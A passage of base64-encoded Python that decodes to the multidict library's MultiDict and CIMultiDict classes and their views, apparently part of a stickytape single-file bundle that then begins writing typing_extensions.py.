gIHJhaXNlIFR5cGVFcnJvcigiY2FuXCd0IHBpY2tsZSB7fSBvYmplY3RzIi5mb3JtYXQoc2VsZi5fX2NsYXNzX18uX19uYW1lX18pKVxyXG5cclxuICAgIGRlZiBjb3B5KHNlbGYpOlxyXG4gICAgICAgICIiIlJldHVybiBhIGNvcHkgb2YgaXRzZWxmLiIiIlxyXG4gICAgICAgIHJldHVybiBNdWx0aURpY3Qoc2VsZi5pdGVtcygpKVxyXG5cclxuXHJcbmNsYXNzIENJTXVsdGlEaWN0UHJveHkoTXVsdGlEaWN0UHJveHkpOlxyXG4gICAgIiIiUmVhZC1vbmx5IHByb3h5IGZvciBDSU11bHRpRGljdCBpbnN0YW5jZS4iIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYXJnKTpcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShhcmcsIChDSU11bHRpRGljdCwgQ0lNdWx0aURpY3RQcm94eSkpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAiY3RvciByZXF1aXJlcyBDSU11bHRpRGljdCBvciBDSU11bHRpRGljdFByb3h5IGluc3RhbmNlIlxyXG4gICAgICAgICAgICAgICAgIiwgbm90IHt9Ii5mb3JtYXQodHlwZShhcmcpKVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2ltcGwgPSBhcmcuX2ltcGxcclxuXHJcbiAgICBkZWYgX3RpdGxlKHNlbGYsIGtleSk6XHJcbiAgICAgICAgcmV0dXJuIGtleS50aXRsZSgpXHJcblxyXG4gICAgZGVmIGNvcHkoc2VsZik6XHJcbiAgICAgICAgIiIiUmV0dXJuIGEgY29weSBvZiBpdHNlbGYuIiIiXHJcbiAgICAgICAgcmV0dXJuIENJTXVsdGlEaWN0KHNlbGYuaXRlbXMoKSlcclxuXHJcblxyXG5jbGFzcyBNdWx0aURpY3QoX0Jhc2UsIE11dGFibGVNdWx0aU1hcHBpbmcpOlxyXG4gICAgIiIiRGljdGlvbmFyeSB3aXRoIHRoZSBzdXBwb3J0IGZvciBkdXBsaWNhdGUga2V5cy4iIiJcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgKmFyZ3MsICoqa3dhcmdzKTpcclxuICAgICAgICBzZWxmLl9pbXBsID0gX0ltcGwoKVxyXG5cclxuICAgICAgICBzZWxmLl9leHRlbmQoYXJncywga3dhcmdzLCBzZWxmLl9fY2xhc3NfXy5fX25hbWVfXywgc2VsZi5fZXh0ZW5kX2l0ZW1zKVxyXG5cclxuICAgIGlmIHN5cy5pbXBsZW1lbnRhdGlvbi5uYW1lICE9ICJweXB5IjpcclxuXHJcbiAgICAgICAgZGVmIF9fc2l6ZW9mX18oc2VsZik6XHJcbiAgICAgICAgICAgIHJldHVybiBvYmplY3QuX19zaXplb2ZfXyhzZWxmKSArIHN5cy5nZXRzaXplb2Yoc2VsZi5faW1wbClcclxuXHJcbiAgICBkZWYgX19yZWR1Y2VfXyhzZWxmKTpcclxuICAgICAgICByZXR1cm4gKHNlbGYuX19jbGFzc19fLCAobGlzdChzZWxmLml0ZW1zKCkpLCkpXHJcblxyXG4gICAgZGVmIF90aXRsZShzZWxmLCBrZXkpOlxyXG4gICAgICAgIHJldHVybiBrZXlcclxuXHJcbiAgICBkZWYgX2tleShzZWxmLCBrZXkpOlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2Uoa2V5LCBzdHIpOlxyXG4gICAgICAgICAgICByZXR1cm4ga2V5XHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIk11bHRpRGljdCBrZXlzIHNob3VsZCBiZSBlaXRoZXIgc3RyICIgIm9yIHN1YmNsYXNzZXMgb2Ygc3RyIlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIGFkZChzZWxmLCBrZXksIHZhbHVlKTpcclxuICAgICAgICBpZGVudGl0eSA9IHNlbGYuX3RpdGxlKGtleSlcclxuICAgICAgICBzZWxmLl9pbXBsLl9pdGVtcy5hcHBlbmQoKGlkZW50aXR5LCBzZWxmLl9rZXkoa2V5KSwgdmFsdWUpKVxyXG4gICAgICAgIHNlbGYuX2ltcGwuaW5jcl92ZXJzaW9uKClcclxuXHJcbiAgICBkZWYgY29weShzZWxmKTpcclxuICAgICAgICAiIiJSZXR1cm4gYSBjb3B5IG9mIGl0c2VsZi4iIiJcclxuICAgICAgICBjbHMgPSBzZWxmLl9fY2xhc3NfX1xyXG4gICAgICAgIHJldHVybiBjbHMoc2VsZi5pdGVtcygpKVxyXG5cclxuICAgIF9fY29weV9fID0gY29weVxyXG5cclxuICAgIGRlZiBleHRlbmQoc2VsZiwgKmFyZ3MsICoqa3dhcmdzKTpcclxuICAgICAgICAiIiJFeHRlbmQgY3VycmVudCBNdWx0aURpY3Qgd2l0aCBtb3JlIHZhbHVlcy5cclxuXHJcbiAgICAgICAgVGhpcyBtZXRob2QgbXVzdCBiZSB1c2VkIGluc3RlYWQgb2YgdXBkYXRlLlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIHNlbGYuX2V4dGVuZChhcmdzLCBrd2FyZ3MsICJleHRlbmQiLCBzZWxmLl9leHRlbmRfaXRlbXMpXHJcblxyXG4gICAgZGVmIF9leHRlbmQoc2VsZiwgYXJncywga3dhcmdzLCBuYW1lLCBtZXRob2QpOlxyXG4gICAgICAgIGlmIGxlbihhcmdzKSA+IDE6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJ7fSB0YWtlcyBhdCBtb3N0IDEgcG9zaXRpb25hbCBhcmd1bWVudCJcclxuICAgICAgICAgICAgICAgICIgKHt9IGdpdmVuKSIuZm9ybWF0KG5hbWUsIGxlbihhcmdzKSlcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGlmIGFyZ3M6XHJcbiAgICAgICAgICAgIGFyZyA9IGFyZ3NbMF1cclxuICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShhcmdzWzBdLCAoTXVsdGlEaWN0LCBNdWx0aURpY3RQcm94eSkpIGFuZCBub3Qga3dhcmdzOlxyXG4gICAgICAgICAgICAgICAgaXRlbXMgPSBhcmcuX2ltcGwuX2l0ZW1zXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBpZiBoYXNhdHRyKGFyZywgIml0ZW1zIik6XHJcbiAgICAgICAgICAgICAgICAgICAgYXJnID0gYXJnLml0ZW1zKClcclxuICAgICAgICAgICAgICAgIGlmIGt3YXJnczpcclxuICAgICAgICAgICAgICAgICAgICBhcmcgPSBsaXN0KGFyZylcclxuICAgICAgICAgICAgICAgICAgICBhcmcuZXh0ZW5kKGxpc3Qoa3dhcmdzLml0ZW1zKCkpKVxyXG4gICAgICAgICAgICAgICAgaXRlbXMgPSBbXVxyXG4gICAgICAgICAgICAgICAgZm9yIGl0ZW0gaW4gYXJnOlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIG5vdCBsZW4oaXRlbSkgPT0gMjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgInt9IHRha2VzIGVpdGhlciBkaWN0IG9yIGxpc3Qgb2YgKGtleSwgdmFsdWUpICJcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJ0dXBsZXMiLmZvcm1hdChuYW1lKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgaXRlbXMuYXBwZW5kKChzZWxmLl90aXRsZShpdGVtWzBdKSwgc2VsZi5fa2V5KGl0ZW1bMF0pLCBpdGVtWzFdKSlcclxuXHJcbiAgICAgICAgICAgIG1ldGhvZChpdGVtcylcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBtZXRob2QoXHJcbiAgICAgICAgICAgICAgICBbXHJcbiAgICAgICAgICAgICAgICAgICAgKHNlbGYuX3RpdGxlKGtleSksIHNlbGYuX2tleShrZXkpLCB2YWx1ZSlcclxuICAgICAgICAgICAgICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiBrd2FyZ3MuaXRlbXMoKVxyXG4gICAgICAgICAgICAgICAgXVxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgZGVmIF9leHRlbmRfaXRlbXMoc2VsZiwgaXRlbXMpOlxyXG4gICAgICAgIGZvciBpZGVudGl0eSwga2V5LCB2YWx1ZSBpbiBpdGVtczpcclxuICAgICAgICAgICAgc2VsZi5hZGQoa2V5LCB2YWx1ZSlcclxuXHJcbiAgICBkZWYgY2xlYXIoc2VsZik6XHJcbiAgICAgICAgIiIiUmVtb3ZlIGFsbCBpdGVtcyBmcm9tIE11bHRpRGljdC4iIiJcclxuICAgICAgICBzZWxmLl9pbXBsLl9pdGVtcy5jbGVhcigpXHJcbiAgICAgICAgc2VsZi5faW1wbC5pbmNyX3ZlcnNpb24oKVxyXG5cclxuICAgICMgTWFwcGluZyBpbnRlcmZhY2UgI1xyXG5cclxuICAgIGRlZiBfX3NldGl0ZW1fXyhzZWxmLCBrZXksIHZhbHVlKTpcclxuICAgICAgICBzZWxmLl9yZXBsYWNlKGtleSwgdmFsdWUpXHJcblxyXG4gICAgZGVmIF9fZGVsaXRlbV9fKHNlbGYsIGtleSk6XHJcbiAgICAgICAgaWRlbnRpdHkgPSBzZWxmLl90aXRsZShrZXkpXHJcbiAgICAgICAgaXRlbXMgPSBzZWxmLl9pbXBsLl9pdGVtc1xyXG4gICAgICAgIGZvdW5kID0gRmFsc2VcclxuICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oaXRlbXMpIC0gMSwgLTEsIC0xKTpcclxuICAgICAgICAgICAgaWYgaXRlbXNbaV1bMF0gPT0gaWRlbnRpdHk6XHJcbiAgICAgICAgICAgICAgICBkZWwgaXRlbXNbaV1cclxuICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZVxyXG4gICAgICAgIGlmIG5vdCBmb3VuZDpcclxuICAgICAgICAgICAgcmFpc2UgS2V5RXJyb3Ioa2V5KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX2ltcGwuaW5jcl92ZXJzaW9uKClcclxuXHJcbiAgICBkZWYgc2V0ZGVmYXVsdChzZWxmLCBrZXksIGRlZmF1bHQ9Tm9uZSk6XHJcbiAgICAgICAgIiIiUmV0dXJuIHZhbHVlIGZvciBrZXksIHNldCB2YWx1ZSB0byBkZWZhdWx0IGlmIGtleSBpcyBub3QgcHJlc2VudC4iIiJcclxuICAgICAgICBpZGVudGl0eSA9IHNlbGYuX3RpdGxlKGtleSlcclxuICAgICAgICBmb3IgaSwgaywgdiBpbiBzZWxmLl9pbXBsLl9pdGVtczpcclxuICAgICAgICAgICAgaWYgaSA9PSBpZGVudGl0eTpcclxuICAgICAgICAgICAgICAgIHJldHVybiB2XHJcbiAgICAgICAgc2VsZi5hZGQoa2V5LCBkZWZhdWx0KVxyXG4gICAgICAgIHJldHVybiBkZWZhdWx0XHJcblxyXG4gICAgZGVmIHBvcG9uZShzZWxmLCBrZXksIGRlZmF1bHQ9X21hcmtlcik6XHJcbiAgICAgICAgIiIiUmVtb3ZlIHNwZWNpZmllZCBrZXkgYW5kIHJldHVybiB0aGUgY29ycmVzcG9uZGluZyB2YWx1ZS5cclxuXHJcbiAgICAgICAgSWYga2V5IGlzIG5vdCBmb3VuZCwgZCBpcyByZXR1cm5lZCBpZiBnaXZlbiwgb3RoZXJ3aXNlXHJcbiAgICAgICAgS2V5RXJyb3IgaXMgcmFpc2VkLlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICBpZGVudGl0eSA9IHNlbGYuX3RpdGxlKGtleSlcclxuICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oc2VsZi5faW1wbC5faXRlbXMpKTpcclxuICAgICAgICAgICAgaWYgc2VsZi5faW1wbC5faXRlbXNbaV1bMF0gPT0gaWRlbnRpdHk6XHJcbiAgICAgICAgICAgICAgICB2YWx1ZSA9IHNlbGYuX2ltcGwuX2l0ZW1zW2ldWzJdXHJcbiAgICAgICAgICAgICAgICBkZWwgc2VsZi5faW1wbC5faXRlbXNbaV1cclxuICAgICAgICAgICAgICAgIHNlbGYuX2ltcGwuaW5jcl92ZXJzaW9uKClcclxuICAgICAgICAgICAgICAgIHJldHVybiB2YWx1ZVxyXG4gICAgICAgIGlmIGRlZmF1bHQgaXMgX21hcmtlcjpcclxuICAgICAgICAgICAgcmFpc2UgS2V5RXJyb3Ioa2V5KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldHVybiBkZWZhdWx0XHJcblxyXG4gICAgcG9wID0gcG9wb25lICAjIHR5cGU6IGlnbm9yZVxyXG5cclxuICAgIGRlZiBwb3BhbGwoc2VsZiwga2V5LCBkZWZhdWx0PV9tYXJrZXIpOlxyXG4gICAgICAgICIiIlJlbW92ZSBhbGwgb2NjdXJyZW5jZXMgb2Yga2V5IGFuZCByZXR1cm4gdGhlIGxpc3Qgb2YgY29ycmVzcG9uZGluZ1xyXG4gICAgICAgIHZhbHVlcy5cclxuXHJcbiAgICAgICAgSWYga2V5IGlzIG5vdCBmb3VuZCwgZGVmYXVsdCBpcyByZXR1cm5lZCBpZiBnaXZlbiwgb3RoZXJ3aXNlXHJcbiAgICAgICAgS2V5RXJyb3IgaXMgcmFpc2VkLlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICBmb3VuZCA9IEZhbHNlXHJcbiAgICAgICAgaWRlbnRpdHkgPSBzZWxmLl90aXRsZShrZXkpXHJcbiAgICAgICAgcmV0ID0gW11cclxuICAgICAgICBmb3IgaSBpbiByYW5nZShsZW4oc2VsZi5faW1wbC5faXRlbXMpIC0gMSwgLTEsIC0xKTpcclxuICAgICAgICAgICAgaXRlbSA9IHNlbGYuX2ltcGwuX2l0ZW1zW2ldXHJcbiAgICAgICAgICAgIGlmIGl0ZW1bMF0gPT0gaWRlbnRpdHk6XHJcbiAgICAgICAgICAgICAgICByZXQuYXBwZW5kKGl0ZW1bMl0pXHJcbiAgICAgICAgICAgICAgICBkZWwgc2VsZi5faW1wbC5faXRlbXNbaV1cclxuICAgICAgICAgICAgICAgIHNlbGYuX2ltcGwuaW5jcl92ZXJzaW9uKClcclxuICAgICAgICAgICAgICAgIGZvdW5kID0gVHJ1ZVxyXG4gICAgICAgIGlmIG5vdCBmb3VuZDpcclxuICAgICAgICAgICAgaWYgZGVmYXVsdCBpcyBfbWFya2VyOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgS2V5RXJyb3Ioa2V5KVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRlZmF1bHRcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXQucmV2ZXJzZSgpXHJcbiAgICAgICAgICAgIHJldHVybiByZXRcclxuXHJcbiAgICBkZWYgcG9waXRlbShzZWxmKTpcclxuICAgICAgICAiIiJSZW1vdmUgYW5kIHJldHVybiBhbiBhcmJpdHJhcnkgKGtleSwgdmFsdWUpIHBhaXIuIiIiXHJcbiAgICAgICAgaWYgc2VsZi5faW1wbC5faXRlbXM6XHJcbiAgICAgICAgICAgIGkgPSBzZWxmLl9pbXBsLl9pdGVtcy5wb3AoMClcclxuICAgICAgICAgICAgc2VsZi5faW1wbC5pbmNyX3ZlcnNpb24oKVxyXG4gICAgICAgICAgICByZXR1cm4gaVsxXSwgaVsyXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIEtleUVycm9yKCJlbXB0eSBtdWx0aWRpY3QiKVxyXG5cclxuICAgIGRlZiB1cGRhdGUoc2VsZiwgKmFyZ3MsICoqa3dhcmdzKTpcclxuICAgICAgICAiIiJVcGRhdGUgdGhlIGRpY3Rpb25hcnkgZnJvbSAqb3RoZXIqLCBvdmVyd3JpdGluZyBleGlzdGluZyBrZXlzLiIiIlxyXG4gICAgICAgIHNlbGYuX2V4dGVuZChhcmdzLCBrd2FyZ3MsICJ1cGRhdGUiLCBzZWxmLl91cGRhdGVfaXRlbXMpXHJcblxyXG4gICAgZGVmIF91cGRhdGVfaXRlbXMoc2VsZiwgaXRlbXMpOlxyXG4gICAgICAgIGlmIG5vdCBpdGVtczpcclxuICAgICAgICAgICAgcmV0dXJuXHJcbiAgICAgICAgdXNlZF9rZXlzID0ge31cclxuICAgICAgICBmb3IgaWRlbnRpdHksIGtleSwgdmFsdWUgaW4gaXRlbXM6XHJcbiAgICAgICAgICAgIHN0YXJ0ID0gdXNlZF9rZXlzLmdldChpZGVudGl0eSwgMClcclxuICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2Uoc3RhcnQsIGxlbihzZWxmLl9pbXBsLl9pdGVtcykpOlxyXG4gICAgICAgICAgICAgICAgaXRlbSA9IHNlbGYuX2ltcGwuX2l0ZW1zW2ldXHJcbiAgICAgICAgICAgICAgICBpZiBpdGVtWzBdID09IGlkZW50aXR5OlxyXG4gICAgICAgICAgICAgICAgICAgIHVzZWRfa2V5c1tpZGVudGl0eV0gPSBpICsgMVxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX2ltcGwuX2l0ZW1zW2ldID0gKGlkZW50aXR5LCBrZXksIHZhbHVlKVxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBzZWxmLl9pbXBsLl9pdGVtcy5hcHBlbmQoKGlkZW50aXR5LCBrZXksIHZhbHVlKSlcclxuICAgICAgICAgICAgICAgIHVzZWRfa2V5c1tpZGVudGl0eV0gPSBsZW4oc2VsZi5faW1wbC5faXRlbXMpXHJcblxyXG4gICAgICAgICMgZHJvcCB0YWlsc1xyXG4gICAgICAgIGkgPSAwXHJcbiAgICAgICAgd2hpbGUgaSA8IGxlbihzZWxmLl9pbXBsLl9pdGVtcyk6XHJcbiAgICAgICAgICAgIGl0ZW0gPSBzZWxmLl9pbXBsLl9pdGVtc1tpXVxyXG4gICAgICAgICAgICBpZGVudGl0eSA9IGl0ZW1bMF1cclxuICAgICAgICAgICAgcG9zID0gdXNlZF9rZXlzLmdldChpZGVudGl0eSlcclxuICAgICAgICAgICAgaWYgcG9zIGlzIE5vbmU6XHJcbiAgICAgICAgICAgICAgICBpICs9IDFcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgIGlmIGkgPj0gcG9zOlxyXG4gICAgICAgICAgICAgICAgZGVsIHNlbGYuX2ltcGwuX2l0ZW1zW2ldXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBpICs9IDFcclxuXHJcbiAgICAgICAgc2VsZi5faW1wbC5pbmNyX3ZlcnNpb24oKVxyXG5cclxuICAgIGRlZiBfcmVwbGFjZShzZWxmLCBrZXksIHZhbHVlKTpcclxuICAgICAgICBrZXkgPSBzZWxmLl9rZXkoa2V5KVxyXG4gICAgICAgIGlkZW50aXR5ID0gc2VsZi5fdGl0bGUoa2V5KVxyXG4gICAgICAgIGl0ZW1zID0gc2VsZi5faW1wbC5faXRlbXNcclxuXHJcbiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGl0ZW1zKSk6XHJcbiAgICAgICAgICAgIGl0ZW0gPSBpdGVtc1tpXVxyXG4gICAgICAgICAgICBpZiBpdGVtWzBdID09IGlkZW50aXR5OlxyXG4gICAgICAgICAgICAgICAgaXRlbXNbaV0gPSAoaWRlbnRpdHksIGtleSwgdmFsdWUpXHJcbiAgICAgICAgICAgICAgICAjIGkgcG9pbnRzIHRvIGxhc3QgZm91bmQgaXRlbVxyXG4gICAgICAgICAgICAgICAgcmd0ID0gaVxyXG4gICAgICAgICAgICAgICAgc2VsZi5faW1wbC5pbmNyX3ZlcnNpb24oKVxyXG4gICAgICAgICAgICAgICAgYnJlYWtcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLl9pbXBsLl9pdGVtcy5hcHBlbmQoKGlkZW50aXR5LCBrZXksIHZhbHVlKSlcclxuICAgICAgICAgICAgc2VsZi5faW1wbC5pbmNyX3ZlcnNpb24oKVxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgIyByZW1vdmUgYWxsIHRhaWwgaXRlbXNcclxuICAgICAgICBpID0gcmd0ICsgMVxyXG4gICAgICAgIHdoaWxlIGkgPCBsZW4oaXRlbXMpOlxyXG4gICAgICAgICAgICBpdGVtID0gaXRlbXNbaV1cclxuICAgICAgICAgICAgaWYgaXRlbVswXSA9PSBpZGVudGl0eTpcclxuICAgICAgICAgICAgICAgIGRlbCBpdGVtc1tpXVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgaSArPSAxXHJcblxyXG5cclxuY2xhc3MgQ0lNdWx0aURpY3QoTXVsdGlEaWN0KTpcclxuICAgICIiIkRpY3Rpb25hcnkgd2l0aCB0aGUgc3VwcG9ydCBmb3IgZHVwbGljYXRlIGNhc2UtaW5zZW5zaXRpdmUga2V5cy4iIiJcclxuXHJcbiAgICBkZWYgX3RpdGxlKHNlbGYsIGtleSk6XHJcbiAgICAgICAgcmV0dXJuIGtleS50aXRsZSgpXHJcblxyXG5cclxuY2xhc3MgX0l0ZXI6XHJcbiAgICBfX3Nsb3RzX18gPSAoIl9zaXplIiwgIl9pdGVyIilcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgc2l6ZSwgaXRlcmF0b3IpOlxyXG4gICAgICAgIHNlbGYuX3NpemUgPSBzaXplXHJcbiAgICAgICAgc2VsZi5faXRlciA9IGl0ZXJhdG9yXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpOlxyXG4gICAgICAgIHJldHVybiBzZWxmXHJcblxyXG4gICAgZGVmIF9fbmV4dF9fKHNlbGYpOlxyXG4gICAgICAgIHJldHVybiBuZXh0KHNlbGYuX2l0ZXIpXHJcblxyXG4gICAgZGVmIF9fbGVuZ3RoX2hpbnRfXyhzZWxmKTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fc2l6ZVxyXG5cclxuXHJcbmNsYXNzIF9WaWV3QmFzZTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBpbXBsKTpcclxuICAgICAgICBzZWxmLl9pbXBsID0gaW1wbFxyXG5cclxuICAgIGRlZiBfX2xlbl9fKHNlbGYpOlxyXG4gICAgICAgIHJldHVybiBsZW4oc2VsZi5faW1wbC5faXRlbXMpXHJcblxyXG5cclxuY2xhc3MgX0l0ZW1zVmlldyhfVmlld0Jhc2UsIGFiYy5JdGVtc1ZpZXcpOlxyXG4gICAgZGVmIF9fY29udGFpbnNfXyhzZWxmLCBpdGVtKTpcclxuICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZShpdGVtLCB0dXBsZSkgb3IgaXNpbnN0YW5jZShpdGVtLCBsaXN0KVxyXG4gICAgICAgIGFzc2VydCBsZW4oaXRlbSkgPT0gMlxyXG4gICAgICAgIGZvciBpLCBrLCB2IGluIHNlbGYuX2ltcGwuX2l0ZW1zOlxyXG4gICAgICAgICAgICBpZiBpdGVtWzBdID09IGsgYW5kIGl0ZW1bMV0gPT0gdjpcclxuICAgICAgICAgICAgICAgIHJldHVybiBUcnVlXHJcbiAgICAgICAgcmV0dXJuIEZhbHNlXHJcblxyXG4gICAgZGVmIF9faXRlcl9fKHNlbGYpOlxyXG4gICAgICAgIHJldHVybiBfSXRlcihsZW4oc2VsZiksIHNlbGYuX2l0ZXIoc2VsZi5faW1wbC5fdmVyc2lvbikpXHJcblxyXG4gICAgZGVmIF9pdGVyKHNlbGYsIHZlcnNpb24pOlxyXG4gICAgICAgIGZvciBpLCBrLCB2IGluIHNlbGYuX2ltcGwuX2l0ZW1zOlxyXG4gICAgICAgICAgICBpZiB2ZXJzaW9uICE9IHNlbGYuX2ltcGwuX3ZlcnNpb246XHJcbiAgICAgICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoIkRpY3Rpb25hcnkgY2hhbmdlZCBkdXJpbmcgaXRlcmF0aW9uIilcclxuICAgICAgICAgICAgeWllbGQgaywgdlxyXG5cclxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcclxuICAgICAgICBsc3QgPSBbXVxyXG4gICAgICAgIGZvciBpdGVtIGluIHNlbGYuX2ltcGwuX2l0ZW1zOlxyXG4gICAgICAgICAgICBsc3QuYXBwZW5kKCJ7IXJ9OiB7IXJ9Ii5mb3JtYXQoaXRlbVsxXSwgaXRlbVsyXSkpXHJcbiAgICAgICAgYm9keSA9ICIsICIuam9pbihsc3QpXHJcbiAgICAgICAgcmV0dXJuICJ7fSh7fSkiLmZvcm1hdChzZWxmLl9fY2xhc3NfXy5fX25hbWVfXywgYm9keSlcclxuXHJcblxyXG5jbGFzcyBfVmFsdWVzVmlldyhfVmlld0Jhc2UsIGFiYy5WYWx1ZXNWaWV3KTpcclxuICAgIGRlZiBfX2NvbnRhaW5zX18oc2VsZiwgdmFsdWUpOlxyXG4gICAgICAgIGZvciBpdGVtIGluIHNlbGYuX2ltcGwuX2l0ZW1zOlxyXG4gICAgICAgICAgICBpZiBpdGVtWzJdID09IHZhbHVlOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuICAgICAgICByZXR1cm4gRmFsc2VcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIF9JdGVyKGxlbihzZWxmKSwgc2VsZi5faXRlcihzZWxmLl9pbXBsLl92ZXJzaW9uKSlcclxuXHJcbiAgICBkZWYgX2l0ZXIoc2VsZiwgdmVyc2lvbik6XHJcbiAgICAgICAgZm9yIGl0ZW0gaW4gc2VsZi5faW1wbC5faXRlbXM6XHJcbiAgICAgICAgICAgIGlmIHZlcnNpb24gIT0gc2VsZi5faW1wbC5fdmVyc2lvbjpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiRGljdGlvbmFyeSBjaGFuZ2VkIGR1cmluZyBpdGVyYXRpb24iKVxyXG4gICAgICAgICAgICB5aWVsZCBpdGVtWzJdXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxyXG4gICAgICAgIGxzdCA9IFtdXHJcbiAgICAgICAgZm9yIGl0ZW0gaW4gc2VsZi5faW1wbC5faXRlbXM6XHJcbiAgICAgICAgICAgIGxzdC5hcHBlbmQoInshcn0iLmZvcm1hdChpdGVtWzJdKSlcclxuICAgICAgICBib2R5ID0gIiwgIi5qb2luKGxzdClcclxuICAgICAgICByZXR1cm4gInt9KHt9KSIuZm9ybWF0KHNlbGYuX19jbGFzc19fLl9fbmFtZV9fLCBib2R5KVxyXG5cclxuXHJcbmNsYXNzIF9LZXlzVmlldyhfVmlld0Jhc2UsIGFiYy5LZXlzVmlldyk6XHJcbiAgICBkZWYgX19jb250YWluc19fKHNlbGYsIGtleSk6XHJcbiAgICAgICAgZm9yIGl0ZW0gaW4gc2VsZi5faW1wbC5faXRlbXM6XHJcbiAgICAgICAgICAgIGlmIGl0ZW1bMV0gPT0ga2V5OlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFRydWVcclxuICAgICAgICByZXR1cm4gRmFsc2VcclxuXHJcbiAgICBkZWYgX19pdGVyX18oc2VsZik6XHJcbiAgICAgICAgcmV0dXJuIF9JdGVyKGxlbihzZWxmKSwgc2VsZi5faXRlcihzZWxmLl9pbXBsLl92ZXJzaW9uKSlcclxuXHJcbiAgICBkZWYgX2l0ZXIoc2VsZiwgdmVyc2lvbik6XHJcbiAgICAgICAgZm9yIGl0ZW0gaW4gc2VsZi5faW1wbC5faXRlbXM6XHJcbiAgICAgICAgICAgIGlmIHZlcnNpb24gIT0gc2VsZi5faW1wbC5fdmVyc2lvbjpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcigiRGljdGlvbmFyeSBjaGFuZ2VkIGR1cmluZyBpdGVyYXRpb24iKVxyXG4gICAgICAgICAgICB5aWVsZCBpdGVtWzFdXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpOlxyXG4gICAgICAgIGxzdCA9IFtdXHJcbiAgICAgICAgZm9yIGl0ZW0gaW4gc2VsZi5faW1wbC5faXRlbXM6XHJcbiAgICAgICAgICAgIGxzdC5hcHBlbmQoInshcn0iLmZvcm1hdChpdGVtWzFdKSlcclxuICAgICAgICBib2R5ID0gIiwgIi5qb2luKGxzdClcclxuICAgICAgICByZXR1cm4gInt9KHt9KSIuZm9ybWF0KHNlbGYuX19jbGFzc19fLl9fbmFtZV9fLCBib2R5KVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgndHlwaW5nX2V4dGVuc2lvbnMucHknLCBiJ2ltcG9ydCBhYmNcbmltcG9ydCBjb2xsZWN0aW9uc1xuaW1wb3J0IGNvbGxlY3Rpb25zLmFiY1xuaW1wb3J0IGZ1bmN0b29sc1xuaW1wb3J0IG9wZXJhdG9yXG5pbXBvcnQgc3lzXG5pbXBvcnQgdHlwZXMgYXMgX3R5cGVzXG5pbXBvcnQgdHlwaW5nXG5cblxuIyBQbGVhc2Uga2VlcCBfX2FsbF9fIGFscGhhYmV0aXplZCB3aXRoaW4gZWFjaCBjYXRlZ29yeS5cbl9fYWxsX18gPSBbXG4gICAgIyBTdXBlci1zcGVjaWFsIHR5cGlu